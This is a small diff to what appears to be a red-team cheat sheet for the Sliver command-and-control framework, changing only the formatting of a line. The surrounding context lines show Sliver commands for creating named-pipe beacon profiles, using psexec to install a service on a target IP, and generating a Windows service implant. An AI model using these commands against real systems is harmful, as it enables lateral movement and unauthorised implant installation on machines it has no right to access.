@@ -54,7 +54,7 @@ sliver > profiles new [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<co
 sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -p <profile_name> <target_IP>
 ```
 
-* You can use a custom exe
+You can use a custom exe
 
 ```
 sliver > generate [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -a x64 -o windows -f service -s /path/to/folder
